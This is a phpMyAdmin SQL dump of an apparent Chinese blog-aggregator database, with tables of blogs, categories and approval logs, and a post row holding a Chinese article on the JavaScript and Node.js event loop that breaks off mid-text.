-- phpMyAdmin SQL Dump
-- version 4.4.13.1
-- http://www.phpmyadmin.net
--
-- Host: 127.0.0.1
-- Generation Time: Sep 19, 2015 at 12:47 PM
-- Server version: 5.6.26
-- PHP Version: 5.5.27

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `blogbar`
--

-- --------------------------------------------------------

--
-- Table structure for table `alembic_version`
--

CREATE TABLE IF NOT EXISTS `alembic_version` (
  `version_num` varchar(32) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `alembic_version`
--

INSERT INTO `alembic_version` (`version_num`) VALUES
('2bab6c129a79');

-- --------------------------------------------------------

--
-- Table structure for table `approvement_log`
--

CREATE TABLE IF NOT EXISTS `approvement_log` (
  `id` int(11) NOT NULL,
  `created_at` datetime DEFAULT NULL,
  `message` text,
  `blog_id` int(11) DEFAULT NULL,
  `status` int(11) DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL,
  `ip` varchar(100) DEFAULT NULL
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8;

--
-- Dumping data for table `approvement_log`
--

INSERT INTO `approvement_log` (`id`, `created_at`, `message`, `blog_id`, `status`, `updated_at`, `ip`) VALUES
(2, '2014-11-30 17:47:30', '', 27, 0, '2015-03-22 23:57:20', NULL),
(3, '2014-11-30 18:04:46', '', 28, 0, '2015-03-22 23:57:19', NULL),
(4, '2014-12-02 23:17:46', '', 29, 0, '2015-03-22 23:57:19', NULL),
(5, '2014-12-05 16:39:32', '', 30, 0, '2015-03-22 23:57:18', '127.0.0.1'),
(6, '2014-12-09 12:49:38', '', 31, 0, '2015-03-22 23:57:17', '127.0.0.1');

-- --------------------------------------------------------

--
-- Table structure for table `blog`
--

CREATE TABLE IF NOT EXISTS `blog` (
  `id` int(11) NOT NULL,
  `author` varchar(50) DEFAULT NULL,
  `feed` varchar(500) DEFAULT NULL,
  `url` varchar(200) DEFAULT NULL,
  `avatar` varchar(200) DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  `feed_version` varchar(20) DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL,
  `subtitle` varchar(100) DEFAULT NULL,
  `title` varchar(100) DEFAULT NULL,
  `is_approved` tinyint(1) DEFAULT NULL,
  `since` int(11) DEFAULT NULL,
  `has_spider` tinyint(1) DEFAULT NULL,
  `is_protected` tinyint(1) DEFAULT NULL,
  `for_special_purpose` tinyint(1) DEFAULT NULL,
  `keywords` text,
  `feed_timezone_offset` int(11) DEFAULT NULL,
  `offline` tinyint(1) DEFAULT NULL,
  `feed_status` int(11) DEFAULT NULL
) ENGINE=InnoDB AUTO_INCREMENT=35 DEFAULT CHARSET=utf8;

--
-- Dumping data for table `blog`
--

INSERT INTO `blog` (`id`, `author`, `feed`, `url`, `avatar`, `created_at`, `feed_version`, `updated_at`, `subtitle`, `title`, `is_approved`, `since`, `has_spider`, `is_protected`, `for_special_purpose`, `keywords`, `feed_timezone_offset`, `offline`, `feed_status`) VALUES
(2, '阮一峰', 'http://www.ruanyifeng.com/blog/atom.xml', 'http://www.ruanyifeng.com/blog/', NULL, '2014-10-31 20:00:00', 'atom10', '2014-11-06 03:05:46', 'Ruan YiFeng''s Blog', '阮一峰的网络日志', 1, 2013, NULL, NULL, NULL, '["\\u7ec6\\u9ed1", "Wilson", "Git", "\\u64cd\\u4f5c\\u7cfb\\u7edf", "\\u521b\\u6295"]', NULL, NULL, NULL),
(5, 'lepture', 'http://feeds.lepture.com/lepture', 'http://lepture.com/', NULL, '2014-11-02 21:14:14', 'atom10', '2014-10-12 02:39:08', NULL, 'Just lepture', 1, NULL, NULL, NULL, NULL, '["\\u65c5\\u820d", "wsgi", "\\u6d31\\u6d77", "\\u6383\\u63cf", "\\u8def\\u4e0a"]', NULL, NULL, NULL),
(6, 'TonySeek', 'https://blog.tonyseek.com/atom.xml', 'https://blog.tonyseek.com/', NULL, '2014-11-02 21:16:32', 'atom10', '2014-07-20 16:07:00', 'Yet Another Seeker', '无知的 TonySeek', 1, NULL, NULL, NULL, NULL, '["Git", "\\u897f\\u65b9", "\\u4e3a\\u4ec0\\u4e48", "\\u5b9e\\u8df5", "\\u7f16\\u8bd1"]', NULL, NULL, NULL),
(7, '胡成', 'http://blog.hucheng.com/rss.xml', 'http://blog.hucheng.com/', NULL, '2014-11-02 21:40:48', 'rss20', '2014-10-18 04:46:58', '胡成的博客', '弗虑弗为', 1, NULL, NULL, NULL, NULL, '["215", "\\u683c\\u7f57\\u5179\\u5c3c", "\\u4e00\\u500b", "\\u5feb\\u9910", "\\u56e0\\u70ba"]', NULL, NULL, NULL),
(8, '唐巧', 'http://blog.devtang.com/atom.xml', 'http://blog.devtang.com/', NULL, '2014-11-02 21:59:44', 'atom10', '2014-10-30 13:37:45', '记录下自己学习的点滴', '唐巧的技术博客', 1, NULL, NULL, NULL, NULL, '["Wenderlich", "K12", "\\u5e03\\u5c40", "\\u52a0\\u73ed", "iTunes"]', NULL, NULL, NULL),
(9, '云风', 'http://blog.codingnow.com/atom.xml', 'http://blog.codingnow.com/', NULL, '2014-11-02 22:11:14', 'atom10', '2014-11-04 07:15:10', '思绪来得快去得也快，偶尔会在这里停留', '云风的 BLOG', 1, 2012, NULL, NULL, NULL, '["\\u5c01\\u88c5", "\\u5904\\u7406", "text", "disunity", "\\u7279\\u6027"]', NULL, NULL, NULL),
(10, '王登科', 'http://www.wdk.pw/feed', 'http://www.wdk.pw/', NULL, '2014-11-02 23:33:27', 'rss20', '2014-11-04 11:37:41', '当代中国大学生的独立博客', 'WDK.PW-DK博客', 1, NULL, NULL, NULL, NULL, '["\\u901a\\u75c5", "\\u7cdf\\u7cd5", "\\u60a0\\u95f2", "\\u7a0b\\u5e8f\\u5458", "\\u8bbe\\u8ba1"]', NULL, NULL, NULL),
(11, 'XDite', 'http://feeds.feedburner.com/xxddite', 'http://blog.xdite.net/', NULL, '2014-11-02 23:38:30', 'atom10', '2014-10-05 06:33:42', '', 'Blog.XDite.net', 1, 0, NULL, NULL, NULL, '["\\u6211\\u60f3", "Git", "\\u4e94\\u4eba", "\\u5404\\u570b", "\\u8cc7\\u6e90"]', 0, NULL, NULL),
(12, '阳志平', 'http://www.yangzhiping.com/feed.xml', 'http://www.yangzhiping.com/', NULL, '2014-11-02 23:40:52', 'atom10', '2014-10-16 02:44:47', '改变世界，从改变自己开始', '阳志平的网志', 1, NULL, NULL, NULL, NULL, '["\\u65e0\\u8da3", "\\u7ed3\\u8bba", "\\u5fc3\\u7406\\u5b66", "\\u8ba4\\u77e5", "\\u5112\\u5bb6"]', NULL, NULL, NULL),
(13, '冯大辉', 'http://feeds.feedburner.com/webarch', 'http://dbanotes.net/', NULL, '2014-11-02 23:43:03', 'rss20', '2014-05-06 03:41:22', '', '闲思录', 1, NULL, NULL, NULL, NULL, '["EOF", "\\u5f00\\u53d1\\u4eba\\u5458", "\\u6c42\\u804c", "\\u4e00\\u4e0b", "\\u4ec0\\u4e48"]', NULL, NULL, NULL),
(14, 'Paul Graham', 'http://www.aaronsw.com/2002/feeds/pgessays.rss', 'http://www.paulgraham.com/', NULL, '2014-11-03 08:37:41', 'rss20', '2015-03-16 08:14:18', 'Scraped feed provided by aaronsw.com', 'Paul Graham', 1, NULL, NULL, NULL, NULL, '[]', NULL, 0, 0),
(15, 'meditic', 'http://feeds.feedburner.com/meditic', 'http://meditic.com/', NULL, '2014-11-03 08:41:14', 'rss20', '2014-07-07 09:25:02', '用自己的方式，度过这唯一的一生', 'Meditic''s Startup Game', 1, NULL, NULL, NULL, NULL, '["\\u4e0d\\u8be5", "\\u964d\\u7ea7", "\\u56fd\\u5bb6", "\\u5220\\u9664", "\\u6765\\u81ea"]', NULL, NULL, NULL),
(16, '徐宥', 'http://blog.youxu.info/feed', 'http://blog.youxu.info/', NULL, '2014-11-03 08:45:10', 'rss20', '2014-06-10 20:28:20', 'I am Eric Xu, a Googler.', '4G spaces', 1, 0, NULL, NULL, NULL, '["\\u63d2\\u4ef6", "\\u4fee\\u884c", "\\u5b9a\\u4e49", "\\u865a\\u62df\\u673a", "\\u7535\\u996d\\u9505"]', 0, NULL, NULL),
(17, '王建硕', 'http://home.wangjianshuo.com/feed', 'http://home.wangjianshuo.com/', NULL, '2014-11-03 09:03:21', 'rss20', '2014-10-24 12:23:27', 'Events (in Shanghai) that affect my life (and others'')', 'Wangjianshuo''s Blog', 1, NULL, NULL, NULL, NULL, '["What", "just", "Paris", "Interesting", "meetings"]', NULL, NULL, NULL),
(18, '王3峰', 'http://www.wang3feng.com/feed/', 'http://www.wang3feng.com/', NULL, '2014-11-03 09:05:55', 'rss20', '2014-06-27 17:54:57', '生命的意义在于折腾，在这里记录我怎么折腾。', '王3峰', 1, NULL, NULL, NULL, NULL, '["\\u63d2\\u4ef6", "\\u81ea\\u8c6a", "\\u5b66\\u4e60\\u6001\\u5ea6", "\\u623f\\u95f4", "\\u65e9\\u8d77"]', NULL, NULL, NULL),
(19, 'Rei', 'http://chloerei.com/feed.xml', 'http://chloerei.com', NULL, '2014-11-03 09:08:21', 'rss20', NULL, 'A web developer.', 'Rei', 1, NULL, NULL, NULL, NULL, '["\\u539f\\u751f", "\\u63d2\\u4ef6", "writings", "\\u610f\\u8bc6\\u5f62\\u6001", "\\u7528\\u6237\\u7fa4"]', NULL, NULL, NULL),
(20, '纯银', 'http://jianshu.milkythinking.com/feeds/users/c22ccc510fb9', 'http://www.jianshu.com/users/c22ccc510fb9/', NULL, '2014-11-04 23:46:30', 'rss20', NULL, '懒得取标题', '纯银V', 1, NULL, NULL, NULL, NULL, '["\\u53ef\\u9a8c\\u8bc1", "\\u7279\\u522b", "\\u804c\\u4f4d", "\\u4e0e\\u6211\\u65e0\\u5173", "\\u8d26\\u53f7"]', NULL, NULL, NULL),
(21, 'yeeyou', 'http://www.yixiaohong.com/feed', 'http://www.yixiaohong.com/', NULL, '2014-11-06 22:25:47', 'rss20', '2014-08-14 10:33:47', '户外、互联网、读书', 'Rules R 2 B Fxcked', 1, NULL, NULL, NULL, NULL, '["\\u5927\\u5bb6", "\\u656c\\u754f", "\\u4ec0\\u4e48", "\\u623f\\u95f4", "\\u8eab\\u4f53"]', NULL, NULL, NULL),
(22, '安意如', 'http://blog.sina.com.cn/rss/1476424833.xml', 'http://blog.sina.com.cn/anyiru', NULL, '2014-11-07 10:27:27', 'rss20', '2014-11-05 16:50:28', '', '安意如大海', 1, 0, NULL, NULL, NULL, '["\\u6c5f\\u6625\\u5165", "\\u8179\\u5730", "\\u8fc4\\u4eca\\u4e3a\\u6b62", "\\u4e24\\u4f4d", "\\u4e09\\u56fd"]', 0, NULL, NULL),
(23, '王垠', NULL, 'http://www.yinwang.org', NULL, '2014-11-13 17:17:18', NULL, NULL, NULL, '当然我在扯淡', 1, NULL, NULL, NULL, NULL, '["NoSQL", "Milner", "\\u51fa\\u6765", "RubySonar", "\\u663e\\u793a"]', NULL, NULL, NULL),
(24, 'lifesinger', NULL, 'https://github.com/lifesinger/lifesinger.github.com/issues?q=label:blog', NULL, NULL, NULL, NULL, NULL, '岁月如歌', 1, NULL, NULL, NULL, NULL, '["alipay", "\\u8fd9\\u4f4d", "global", "YUI", "isType"]', NULL, NULL, NULL),
(25, 'Livid', NULL, 'http://livid.v2ex.com', NULL, '2014-11-15 11:37:58', NULL, NULL, '', 'Livid', 1, NULL, NULL, NULL, NULL, '["\\u63d2\\u4ef6", "\\u4e00\\u5207", "\\u65c5\\u7a0b", "\\u653b\\u51fb", "\\u8981\\u4e48"]', NULL, NULL, NULL),
(27, 'ds', '', 'http://sss.sdad.sd', NULL, '2014-11-30 17:47:29', NULL, NULL, '', 'ss', 0, 0, 0, 0, 0, NULL, 0, 0, NULL),
(28, '打算打算', '', 'http://blog.xdite.nset/', NULL, '2014-11-30 18:04:46', NULL, NULL, '', 'dasd', 0, 0, 0, 0, 0, NULL, 0, 0, NULL),
(29, 'ss', '', 'http://blog.xdite.net/s', NULL, '2014-12-02 23:17:46', NULL, NULL, '', 'sd', 0, 0, 0, 0, 0, NULL, 0, 0, NULL),
(30, 'sada', 'http://dsad', 'http://fuck.com', NULL, '2014-12-05 16:39:32', NULL, NULL, '', 'sda', 0, 0, 0, 0, 0, NULL, 0, 0, NULL),
(31, 'sadas', 'http://dsadas', 'http://blog.sina.com.cn/anyiruss', NULL, '2014-12-09 12:49:38', NULL, NULL, '', 'dasd', 0, 0, 0, 0, 0, NULL, 0, 0, NULL),
(32, 'Lucida', 'http://lucida.me/atom.xml', 'http://lucida.me', NULL, '2015-02-24 12:16:31', 'atom10', NULL, NULL, 'Lucida', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 2),
(33, '笑遍世界', 'http://smilejay.com/feed/', 'http://smilejay.com', NULL, '2015-01-12 17:20:32', 'rss20', '2015-02-28 05:58:02', 'Stay hungry, stay foolish.', '笑遍世界的博客', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0),
(34, NULL, 'http://jianshu.milkythinking.com/feeds/users/6ab3cc3682ba', NULL, NULL, NULL, 'rss20', '2015-03-14 03:30:00', '真实，平静，勇敢，知行合一。对外汉语教师。', 'Yanjun''s blog', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0);

-- --------------------------------------------------------

--
-- Table structure for table `blog_kind`
--

CREATE TABLE IF NOT EXISTS `blog_kind` (
  `kind_id` int(11) DEFAULT NULL,
  `blog_id` int(11) DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  `id` int(11) NOT NULL,
  `show_order` int(11) DEFAULT NULL
) ENGINE=InnoDB AUTO_INCREMENT=14 DEFAULT CHARSET=utf8;

--
-- Dumping data for table `blog_kind`
--

INSERT INTO `blog_kind` (`kind_id`, `blog_id`, `created_at`, `id`, `show_order`) VALUES
(7, 22, NULL, 1, NULL),
(4, 22, NULL, 2, NULL),
(7, 11, NULL, 3, NULL),
(6, 11, NULL, 4, NULL),
(5, 11, NULL, 5, NULL),
(4, 11, NULL, 6, NULL),
(7, 16, NULL, 7, NULL),
(6, 16, NULL, 8, NULL),
(5, 16, NULL, 9, NULL),
(4, 16, NULL, 10, NULL),
(2, 28, '2014-11-30 18:04:46', 12, 0),
(6, 28, '2014-11-30 18:04:46', 13, 0);

-- --------------------------------------------------------

--
-- Table structure for table `grab_log`
--

CREATE TABLE IF NOT EXISTS `grab_log` (
  `id` int(11) NOT NULL,
  `created_at` datetime DEFAULT NULL,
  `blog_id` int(11) DEFAULT NULL,
  `details` text,
  `message` text
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `kind`
--

CREATE TABLE IF NOT EXISTS `kind` (
  `id` int(11) NOT NULL,
  `name` varchar(20) DEFAULT NULL,
  `parent_id` int(11) DEFAULT NULL,
  `show_order` int(11) DEFAULT NULL,
  `created_at` datetime DEFAULT NULL
) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8;

--
-- Dumping data for table `kind`
--

INSERT INTO `kind` (`id`, `name`, `parent_id`, `show_order`, `created_at`) VALUES
(1, '文化', NULL, NULL, NULL),
(2, '科技', NULL, NULL, NULL),
(3, '生活', NULL, NULL, NULL),
(4, '艺术', 1, NULL, NULL),
(5, '算法', 2, NULL, NULL),
(6, '旅游', 3, NULL, NULL),
(7, '编程', 2, NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `post`
--

CREATE TABLE IF NOT EXISTS `post` (
  `id` int(11) NOT NULL,
  `url` varchar(500) DEFAULT NULL,
  `title` varchar(200) DEFAULT NULL,
  `content` text,
  `created_at` datetime DEFAULT NULL,
  `blog_id` int(11) DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL,
  `published_at` datetime DEFAULT NULL,
  `hide` tinyint(1) DEFAULT NULL,
  `keywords` text,
  `clicks` int(11) DEFAULT NULL,
  `recommend` tinyint(1) DEFAULT NULL,
  `pure_content` text,
  `need_analysis` tinyint(1) DEFAULT NULL,
  `published_at_exceed` tinyint(1) DEFAULT NULL,
  `updated_at_exceed` tinyint(1) DEFAULT NULL
) ENGINE=InnoDB AUTO_INCREMENT=622 DEFAULT CHARSET=utf8;

--
-- Dumping data for table `post`
--

INSERT INTO `post` (`id`, `url`, `title`, `content`, `created_at`, `blog_id`, `updated_at`, `published_at`, `hide`, `keywords`, `clicks`, `recommend`, `pure_content`, `need_analysis`, `published_at_exceed`, `updated_at_exceed`) VALUES
(11, 'http://www.ruanyifeng.com/blog/2014/10/event-loop.html', 'JavaScript 运行机制详解：再谈Event Loop', '<p>一年前，我写了一篇<a href="http://www.ruanyifeng.com/blog/2013/10/event_loop.html">《什么是 Event Loop？》</a>，谈了我对Event Loop的理解。</p>\n\n        <p>上个月，我偶然看到了Philip Roberts的演讲<a href="http://vimeo.com/96425312">《Help, I''m stuck in an event-loop》</a>。这才尴尬地发现，自己的理解是错的。我决定重写这个题目，详细、完整、正确地描述JavaScript引擎的内部运行机制。下面就是我的重写。</p>\n\n<p>进入正文之前，插播一条消息。我的新书<a href="http://es6.ruanyifeng.com/">《ECMAScript 6入门》</a>出版了（<a href="http://es6.ruanyifeng.com/images/copyright.png">版权页</a>，<a href="http://es6.ruanyifeng.com/images/page1.png">内页1</a>，<a href="http://es6.ruanyifeng.com/images/page2.png">内页2</a>），铜版纸全彩印刷，非常精美，还附有索引（当然价格也比同类书籍略贵一点点）。预览和购买点击<a href="http://es6.ruanyifeng.com/">这里</a>。</p>\n\n<p><a href="http://es6.ruanyifeng.com/images/cover.jpg"><img alt="cover" src="http://es6.ruanyifeng.com/images/cover_thumbnail.jpg" title="" /></a></p>\n\n<p>（<strong>2014年10月13日更新</strong>：本文已经做了较大修改，反映了我现在的认识。关于setTimeout的更多解释和示例，请参阅我正在写的<a href="http://javascript.ruanyifeng.com/bom/timer.html">《JavaScript标准参考教程》</a>。）</p>\n\n<p>（<strong>2014年10月11日更新</strong>：朴灵老师对本文做了<a href="https://app.yinxiang.com/shard/s8/sh/b72fe246-a89d-434b-85f0-a36420849b84/59bad790bdcf6b0a66b8b93d5eacbead">评注</a>，详细得指出了文中存在的错误说法，建议阅读。）</p>\n\n<h2>一、为什么JavaScript是单线程？</h2>\n\n<p>JavaScript语言的一大特点就是单线程，也就是说，同一个时间只能做一件事。那么，为什么JavaScript不能有多个线程呢？这样能提高效率啊。</p>\n\n<p>JavaScript的单线程，与它的用途有关。作为浏览器脚本语言，JavaScript的主要用途是与用户互动，以及操作DOM。这决定了它只能是单线程，否则会带来很复杂的同步问题。比如，假定JavaScript同时有两个线程，一个线程在某个DOM节点上添加内容，另一个线程删除了这个节点，这时浏览器应该以哪个线程为准？</p>\n\n<p>所以，为了避免复杂性，从一诞生，JavaScript就是单线程，这已经成了这门语言的核心特征，将来也不会改变。</p>\n\n<p>为了利用多核CPU的计算能力，HTML5提出Web Worker标准，允许JavaScript脚本创建多个线程，但是子线程完全受主线程控制，且不得操作DOM。所以，这个新标准并没有改变JavaScript单线程的本质。</p>\n\n<h2>二、任务队列</h2>\n\n<p>单线程就意味着，所有任务需要排队，前一个任务结束，才会执行后一个任务。如果前一个任务耗时很长，后一个任务就不得不一直等着。</p>\n\n<p>如果排队是因为计算量大，CPU忙不过来，倒也算了，但是很多时候CPU是闲着的，因为IO设备（输入输出设备）很慢（比如Ajax操作从网络读取数据），不得不等着结果出来，再往下执行。</p>\n\n<p>JavaScript语言的设计者意识到，这时主线程完全可以不管IO设备，挂起处于等待中的任务，先运行排在后面的任务。等到IO设备返回了结果，再回过头，把挂起的任务继续执行下去。</p>\n\n<p>于是，所有任务可以分成两种，一种是同步任务（synchronous），另一种是异步任务（asynchronous）。同步任务指的是，在主线程上排队执行的任务，只有前一个任务执行完毕，才能执行后一个任务；异步任务指的是，不进入主线程、而进入"任务队列"（task queue）的任务，只有"任务队列"通知主线程，某个异步任务可以执行了，该任务才会进入主线程执行。</p>\n\n<p>具体来说，异步执行的运行机制如下。（同步执行也是如此，因为它可以被视为没有异步任务的异步执行。）</p>\n\n<blockquote>\n  <p>（1）所有同步任务都在主线程上执行，形成一个<a href="http://www.ruanyifeng.com/blog/2013/11/stack.html">执行栈</a>（execution context stack）。</p>\n\n<p>（2）主线程之外，还存在一个"任务队列"（task\nqueue）。只要异步任务有了运行结果，就在"任务队列"之中放置一个事件。</p>\n\n<p>（3）一旦"执行栈"中的所有同步任务执行完毕，系统就会读取"任务队列"，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行。</p>\n\n<p>（4）主线程不断重复上面的第三步。</p>\n</blockquote>\n\n<p>下图就是主线程和任务队列的示意图。</p>\n\n<p><img alt="任务队列" src="http://image.beekka.com/blog/2014/bg2014100801.jpg" title="" /></p>\n\n<p>只要主线程空了，就会去读取"任务队列"，这就是JavaScript的运行机制。这个过程会不断重复。</p>\n\n<h2>三、事件和回调函数</h2>\n\n<p>"任务队列"是一个事件的队列（也可以理解成消息的队列），IO设备完成一项任务，就在"任务队列"中添加一个事件，表示相关的异步任务可以进入"执行栈"了。主线程读取"任务队列"，就是读取里面有哪些事件。</p>\n\n<p>"任务队列"中的事件，除了IO设备的事件以外，还包括一些用户产生的事件（比如鼠标点击、页面滚动等等）。只要指定过回调函数，这些事件发生时就会进入"任务队列"，等待主线程读取。</p>\n\n<p>所谓"回调函数"（callback），就是那些会被主线程挂起来的代码。异步任务必须指定回调函数，当主线程开始执行异步任务，就是执行对应的回调函数。</p>\n\n<p>"任务队列"是一个先进先出的数据结构，排在前面的事件，优先被主线程读取。主线程的读取过程基本上是自动的，只要执行栈一清空，"任务队列"上第一位的事件就自动进入主线程。但是，由于存在后文提到的"定时器"功能，主线程首先要检查一下执行时间，某些事件只有到了规定的时间，才能返回主线程。</p>\n\n<h2>四、Event Loop</h2>\n\n<p>主线程从"任务队列"中读取事件，这个过程是循环不断的，所以整个的这种运行机制又称为Event Loop（事件循环）。</p>\n\n<p>为了更好地理解Event Loop，请看下图（转引自Philip Roberts的演讲<a href="http://vimeo.com/96425312">《Help, I''m stuck in an event-loop》</a>）。</p>\n\n<p><img alt="Event Loop" src="http://image.beekka.com/blog/2014/bg2014100802.png" title="" /></p>\n\n<p>上图中，主线程运行的时候，产生堆（heap）和栈（stack），栈中的代码调用各种外部API，它们在"任务队列"中加入各种事件（click，load，done）。只要栈中的代码执行完毕，主线程就会去读取"任务队列"，依次执行那些事件所对应的回调函数。</p>\n\n<p>执行栈中的代码（同步任务），总是在读取"任务队列"（异步任务）之前执行。请看下面这个例子。</p>\n\n<blockquote><pre><code class="language-javascript">\n    var req = new XMLHttpRequest();\n    req.open(''GET'', url);    \n    req.onload = function (){};    \n    req.onerror = function (){};    \n    req.send();\n</code></pre></blockquote>\n\n<p>上面代码中的req.send方法是Ajax操作向服务器发送数据，它是一个异步任务，意味着只有当前脚本的所有代码执行完，系统才会去读取"任务队列"。所以，它与下面的写法等价。</p>\n\n<blockquote><pre><code class="language-javascript">\n    var req = new XMLHttpRequest();\n    req.open(''GET'', url);\n    req.send();\n    req.onload = function (){};    \n    req.onerror = function (){};   \n</code></pre></blockquote>\n\n<p>也就是说，指定回调函数的部分（onload和onerror），在send()方法的前面或后面无关紧要，因为它们属于执行栈的一部分，系统总是执行完它们，才会去读取"任务队列"。</p>\n\n<h2>五、定时器</h2>\n\n<p>除了放置异步任务的事件，"任务队列"还可以放置定时事件，即指定某些代码在多少时间之后执行。这叫做"定时器"（timer）功能，也就是定时执行的代码。</p>\n\n<p>定时器功能主要由setTimeout()和setInterval()这两个函数来完成，它们的内部运行机制完全一样，区别在于前者指定的代码是一次性执行，后者则为反复执行。以下主要讨论setTimeout()。</p>\n\n<p>setTimeout()接受两个参数，第一个是回调函数，第二个是推迟执行的毫秒数。</p>\n\n<blockquote><pre><code class="language-javascript">\nconsole.log(1);\nsetTimeout(function(){console.log(2);},1000);\nconsole.log(3);\n</code></pre></blockquote>\n\n<p>上面代码的执行结果是1，3，2，因为setTimeout()将第二行推迟到1000毫秒之后执行。</p>\n\n<p>如果将setTimeout()的第二个参数设为0，就表示当前代码执行完（执行栈清空）以后，立即执行（0毫秒间隔）指定的回调函数。</p>\n\n<blockquote><pre><code class="language-javascript">\nsetTimeout(function(){console.log(1);}, 0);\nconsole.log(2);\n</code></pre></blockquote>\n\n<p>上面代码的执行结果总是2，1，因为只有在执行完第二行以后，系统才会去执行"任务队列"中的回调函数。</p>\n\n<p>总之，setTimeout(fn,0)的含义是，指定某个任务在主线程最早可得的空闲时间执行，也就是说，尽可能早得执行。它在"任务队列"的尾部添加一个事件，因此要等到同步任务和"任务队列"现有的事件都处理完，才会得到执行。</p>\n\n<p>HTML5标准规定了setTimeout()的第二个参数的最小值（最短间隔），不得低于4毫秒，如果低于这个值，就会自动增加。在此之前，老版本的浏览器都将最短间隔设为10毫秒。另外，对于那些DOM的变动（尤其是涉及页面重新渲染的部分），通常不会立即执行，而是每16毫秒执行一次。这时使用requestAnimationFrame()的效果要好于setTimeout()。</p>\n\n<p>需要注意的是，setTimeout()只是将事件插入了"任务队列"，必须等到当前代码（执行栈）执行完，主线程才会去执行它指定的回调函数。要是当前代码耗时很长，有可能要等很久，所以并没有办法保证，回调函数一定会在setTimeout()指定的时间执行。</p>\n\n<h2>六、Node.js的Event Loop</h2>\n\n<p>Node.js也是单线程的Event Loop，但是它的运行机制不同于浏览器环境。</p>\n\n<p>请看下面的示意图（作者<a href="https://twitter.com/BusyRich/status/494959181871316992">@BusyRich</a>）。</p>\n\n<p><img alt="Node.js" src="http://image.beekka.com/blog/2014/bg2014100803.png" title="" /></p>\n\n<p>根据上图，Node.js的运行机制如下。</p>\n\n<blockquote>\n  <p>（1）V8引擎解析JavaScript脚本。</p>\n\n<p>（2）解析后的代码，调用Node API。</p>\n\n<p>（3）<a href="https://github.com/joyent/libuv">libuv库</a>负责Node\nAPI的执行。它将不同的任务分配给不同的线程，形成一个Event Loop（事件循环），以异步的方式将任务的执行结果返回给V8引擎。</p>\n\n<p>（4）V8引擎再将结果返回给用户。</p>\n</blockquote>\n\n<p>除了setTimeout和setInterval这两个方法，Node.js还提供了另外两个与"任务队列"有关的方法：<a href="http://nodejs.org/docs/latest/api/process.html#process_process_nexttick_callback">process.nextTick</a>和<a href="http://nodejs.org/docs/latest/api/timers.html#timers_setimmediate_callback_arg">setImmediate</a>。它们可以帮助我们加深对"任务队列"的理解。</p>\n\n<p>process.nextTick方法可以在当前"执行栈"的尾部----下一次Event Loop（主线程读取"任务队列"）之前----触发回调函数。也就是说，它指定的任务总是发生在所有异步任务之前。setImmediate方法则是在当前"任务队列"的尾部添加事件，也就是说，它指定的任务总是在下一次Event Loop时执行，这与setTimeout(fn, 0)很像。请看下面的例子（via <a href="http://stackoverflow.com/questions/17502948/nexttick-vs-setimmediate-visual-explanation">StackOverflow</a>）。</p>\n\n<blockquote><pre><code class="language-javascript">\nprocess.nextTick(function A() {\n  console.log(1);\n  process.nextTick(function B(){console.log(2);});\n});\n\nsetTimeout(function timeout() {\n  console.log(''TIMEOUT FIRED'');\n}, 0)\n// 1\n// 2\n// TIMEOUT FIRED\n</code></pre></blockquote>\n\n<p>上面代码中，由于process.nextTick方法指定的回调函数，总是在当前"执行栈"的尾部触发，所以不仅函数A比setTimeout指定的回调函数timeout先执行，而且函数B也比timeout先执行。这说明，如果有多个process.nextTick语句（不管它们是否嵌套），将全部在当前"执行栈"执行。</p>\n\n<p>现在，再看setImmediate。</p>\n\n<blockquote><pre><code class="language-javascript">\nsetImmediate(function A() {\n  console.log(1);\n  setImmediate(function B(){console.log(2);});\n});\n\nsetTimeout(function timeout() {\n  console.log(''TIMEOUT FIRED'');\n}, 0);\n</code></pre></blockquote>\n\n<p>上面代码中，setImmediate与setTimeout(fn,0)各自添加了一个回调函数A和timeout，都是在下一次Event Loop触发。那么，哪个回调函数先执行呢？答案是不确定。运行结果可能是1--TIMEOUT FIRED--2，也可能是TIMEOUT FIRED--1--2。</p>\n\n<p>令人困惑的是，Node.js文档中称，setImmediate指定的回调函数，总是排在setTimeout前面。实际上，这种情况只发生在递归调用的时候。</p>\n\n<blockquote><pre><code class="language-javascript">\nsetImmediate(function (){\n  setImmediate(function A() {\n    console.log(1);\n    setImmediate(function B(){console.log(2);});\n  });\n\n  setTimeout(function timeout() {\n    console.log(''TIMEOUT FIRED'');\n  }, 0);\n});\n// 1\n// TIMEOUT FIRED\n// 2\n</code></pre></blockquote>\n\n<p>上面代码中，setImmediate和setTimeout被封装在一个setImmediate里面，它的运行结果总是1--TIMEOUT FIRED--2，这时函数A一定在timeout前面触发。至于2排在TIMEOUT FIRED的后面（即函数B在timeout后面触发），是因为setImmediate总是将事件注册到下一轮Event Loop，所以函数A和timeout是在同一轮Loop执行，而函数B在下一轮Loop执行。</p>\n\n<p>我们由此得到了process.nextTick和setImmediate的一个重要区别：多个process.nextTick语句总是在当前"执行栈"一次执行完，多个setImmediate可能则需要多次loop才能执行完。事实上，这正是Node.js 10.0版添加setImmediate方法的原因，否则像下面这样的递归调用process.nextTick，将会没完没了，主线程根本不会去读取"事件队列"！</p>\n\n<blockquote><pre><code class="language-javascript">\nprocess.nextTick(function foo() {\n  